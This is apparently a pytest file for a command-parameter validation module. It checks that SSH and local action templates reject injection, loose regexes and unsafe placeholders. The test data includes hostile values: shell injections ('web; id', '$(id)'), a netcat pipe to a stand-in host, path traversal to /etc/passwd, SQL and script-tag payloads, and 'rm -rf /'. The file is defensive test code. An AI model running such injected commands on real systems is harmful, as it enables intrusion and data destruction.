"""Action parameter schemas — the security boundary for admin-defined commands.

A diagnostic is hardcoded and safe by construction. An action is written by an
administrator and is only as safe as this module. The tests are weighted
accordingly: nearly all of them are rejections.
"""

from __future__ import annotations

import pytest

from app.core.validation import ValidationError
from app.modules.actions.schema import (
    ParamSpec,
    build_argv,
    build_ssh_command,
    coerce,
    parse_schema,
    redact,
    validate_template,
)

CONTAINER = {"container": {"type": "string", "pattern": r"^[a-zA-Z0-9_.-]{1,64}$"}}


class TestSchemaParsing:
    def test_a_reasonable_schema_parses(self) -> None:
        specs = parse_schema(CONTAINER, execution_type="ssh")
        assert specs["container"].pattern == r"^[a-zA-Z0-9_.-]{1,64}$"

    def test_ssh_string_parameters_require_a_pattern(self) -> None:
        """The rule the whole SSH path rests on. Enforced when the action is
        saved, so an unsafe definition cannot be stored and then run later."""
        with pytest.raises(ValidationError, match="needs a pattern"):
            parse_schema({"name": {"type": "string"}}, execution_type="ssh")

    def test_a_fixed_set_of_choices_satisfies_the_ssh_rule(self) -> None:
        specs = parse_schema(
            {"unit": {"type": "string", "choices": ["nginx", "docker"]}}, execution_type="ssh"
        )
        assert specs["unit"].choices == ["nginx", "docker"]

    def test_local_string_parameters_do_not_need_one(self) -> None:
        """Argv is a genuine boundary locally — metacharacters are inert."""
        assert parse_schema({"name": {"type": "string"}}, execution_type="local")

    @pytest.mark.parametrize("useless", [".*", "^.*$", ".+", "^.+$", "", "(.*)"])
    def test_patterns_that_match_anything_are_refused(self, useless: str) -> None:
        """Worse than no pattern: it looks like a constraint and is not."""
        with pytest.raises(ValidationError, match="matches anything"):
            parse_schema({"name": {"type": "string", "pattern": useless}}, execution_type="ssh")

    def test_an_invalid_regex_is_refused(self) -> None:
        with pytest.raises(ValidationError, match="not valid"):
            parse_schema(
                {"name": {"type": "string", "pattern": "([unclosed"}}, execution_type="ssh"
            )

    @pytest.mark.parametrize("bad", ["1name", "na me", "na-me", "", "x" * 40, "$name"])
    def test_invalid_parameter_names_are_refused(self, bad: str) -> None:
        with pytest.raises(ValidationError):
            parse_schema({bad: {"type": "string"}}, execution_type="local")

    def test_an_unknown_type_is_refused(self) -> None:
        with pytest.raises(ValidationError, match="must be one of"):
            parse_schema({"name": {"type": "command"}}, execution_type="local")

    def test_too_many_parameters_are_refused(self) -> None:
        schema = {f"p{index}": {"type": "string"} for index in range(20)}
        with pytest.raises(ValidationError, match="at most"):
            parse_schema(schema, execution_type="local")


class TestTemplateValidation:
    def test_a_valid_local_template(self) -> None:
        specs = parse_schema({}, execution_type="local")
        validate_template(["ping", "-c", "1", "10.0.0.1"], specs, execution_type="local")

    def test_a_placeholder_must_be_a_whole_token(self) -> None:
        """`--name={container}` is the crack through which one parameter becomes
        two arguments, or a flag."""
        specs = parse_schema(CONTAINER, execution_type="ssh")
        with pytest.raises(ValidationError, match="embeds a parameter"):
            validate_template(["docker", "--name={container}"], specs, execution_type="ssh")

    def test_the_program_cannot_be_a_parameter(self) -> None:
        """Otherwise a parameter chooses what runs, which is the whole game."""
        specs = parse_schema(
            {"program": {"type": "string", "pattern": "^[a-z]+$"}}, execution_type="ssh"
        )
        with pytest.raises(ValidationError, match="cannot be a parameter"):
            validate_template(["{program}", "--version"], specs, execution_type="ssh")

    def test_a_template_referencing_an_undefined_parameter_is_refused(self) -> None:
        specs = parse_schema({}, execution_type="local")
        with pytest.raises(ValidationError, match="not defined in the schema"):
            validate_template(["ping", "{target}"], specs, execution_type="local")

    def test_a_schema_defining_an_unused_parameter_is_refused(self) -> None:
        """Usually a typo in one of the two, and silently ignoring it means the
        operator's intended constraint never applies."""
        specs = parse_schema(CONTAINER, execution_type="ssh")
        with pytest.raises(ValidationError, match="never uses"):
            validate_template(["docker", "ps"], specs, execution_type="ssh")

    def test_an_empty_template_is_refused(self) -> None:
        with pytest.raises(ValidationError, match="non-empty"):
            validate_template([], {}, execution_type="local")

    def test_a_local_action_must_name_an_allowlisted_program(self) -> None:
        """Refused at definition time rather than failing for whoever clicks it."""
        specs = parse_schema({}, execution_type="local")
        with pytest.raises(ValidationError):
            validate_template(["bash", "-c", "id"], specs, execution_type="local")

    def test_an_ssh_template_is_not_checked_against_the_local_allowlist(self) -> None:
        """The remote host has its own binaries; ours are irrelevant there."""
        specs = parse_schema(CONTAINER, execution_type="ssh")
        validate_template(["docker", "restart", "{container}"], specs, execution_type="ssh")


class TestCoercion:
    def test_a_matching_value_passes(self) -> None:
        spec = ParamSpec("container", pattern=r"^[a-z0-9-]+$")
        assert coerce("web-1", spec) == "web-1"

    @pytest.mark.parametrize(
        "hostile",
        [
            "web; id",
            "web && id",
            "web | nc evil 1234",
            "$(id)",
            "`id`",
            "web\nid",
            "../../etc/passwd",
            "web' OR '1'='1",
        ],
    )
    def test_injection_shaped_values_are_refused_by_the_pattern(self, hostile: str) -> None:
        spec = ParamSpec("container", pattern=r"^[a-zA-Z0-9_.-]{1,64}$")
        with pytest.raises(ValidationError, match="does not match"):
            coerce(hostile, spec)

    def test_the_rejected_value_is_not_echoed_back(self) -> None:
        """It is attacker-supplied and would otherwise land in an error page."""
        spec = ParamSpec("container", pattern=r"^[a-z]+$")
        with pytest.raises(ValidationError) as caught:
            coerce("<script>alert(1)</script>", spec)
        assert "<script>" not in str(caught.value)

    def test_nul_bytes_are_refused(self) -> None:
        with pytest.raises(ValidationError, match="NUL"):
            coerce("web\x00; id", ParamSpec("container"))

    def test_overlong_values_are_refused(self) -> None:
        with pytest.raises(ValidationError, match="longer than"):
            coerce("x" * 5000, ParamSpec("container"))

    def test_a_missing_required_value_is_refused(self) -> None:
        with pytest.raises(ValidationError, match="required"):
            coerce(None, ParamSpec("container", required=True))

    def test_an_optional_value_may_be_absent(self) -> None:
        assert coerce(None, ParamSpec("container", required=False)) == ""

    class TestIntegers:
        def test_bounds_are_enforced(self) -> None:
            spec = ParamSpec("count", type="integer", minimum=1, maximum=10)
            assert coerce("5", spec) == "5"
            with pytest.raises(ValidationError, match="at least"):
                coerce("0", spec)
            with pytest.raises(ValidationError, match="at most"):
                coerce("11", spec)

        def test_non_numeric_is_refused(self) -> None:
            with pytest.raises(ValidationError, match="whole number"):
                coerce("5; id", ParamSpec("count", type="integer"))

    class TestChoices:
        def test_only_listed_values_pass(self) -> None:
            spec = ParamSpec("unit", choices=["nginx", "docker"])
            assert coerce("nginx", spec) == "nginx"
            with pytest.raises(ValidationError, match="must be one of"):
                coerce("nginx; id", spec)


class TestArgvBuilding:
    def test_each_parameter_becomes_exactly_one_token(self) -> None:
        specs = parse_schema({"target": {"type": "string"}}, execution_type="local")
        argv = build_argv(["ping", "-c", "1", "{target}"], specs, {"target": "10.0.0.1"})
        assert argv == ["ping", "-c", "1", "10.0.0.1"]

    def test_a_value_with_spaces_stays_one_token(self) -> None:
        """The property that makes local execution injection-proof: the value is
        passed to the program as one literal, whatever it contains."""
        specs = parse_schema({"target": {"type": "string"}}, execution_type="local")
        argv = build_argv(["ping", "{target}"], specs, {"target": "10.0.0.1 -oN /tmp/x"})
        assert argv == ["ping", "10.0.0.1 -oN /tmp/x"]
        assert len(argv) == 2

    def test_static_tokens_pass_through_untouched(self) -> None:
        specs = parse_schema({}, execution_type="local")
        assert build_argv(["ip", "route", "show"], specs, {}) == ["ip", "route", "show"]


class TestSshCommandBuilding:
    def test_values_are_shell_quoted(self) -> None:
        """sshd hands the string to the remote login shell, so quoting is the
        second line of defence behind the pattern."""
        specs = parse_schema(CONTAINER, execution_type="ssh")
        command = build_ssh_command(
            ["docker", "restart", "{container}"], specs, {"container": "web-1"}
        )
        assert command == "docker restart web-1"

    def test_a_value_that_slipped_a_loose_pattern_is_still_quoted(self) -> None:
        """Belt and braces. If a pattern were ever written too permissively, the
        quoting still prevents the value being interpreted as shell syntax."""
        specs = {"name": ParamSpec("name", pattern=r"^.{1,64}$")}
        command = build_ssh_command(["echo", "{name}"], specs, {"name": "a; rm -rf /"})
        assert "; rm -rf /" not in command.replace("'a; rm -rf /'", "")
        assert command == "echo 'a; rm -rf /'"

    def test_template_tokens_are_quoted_too(self) -> None:
        specs = parse_schema({}, execution_type="ssh")
        assert build_ssh_command(["ls", "-la"], specs, {}) == "ls -la"


class TestRedaction:
    def test_secret_parameters_are_masked_before_storage(self) -> None:
        specs = {
            "user": ParamSpec("user"),
            "password": ParamSpec("password", secret=True),
        }
        masked = redact({"user": "admin", "password": "hunter2"}, specs)
        assert masked == {"user": "admin", "password": "[redacted]"}

    def test_unknown_keys_pass_through(self) -> None:
        assert redact({"extra": "value"}, {}) == {"extra": "value"}
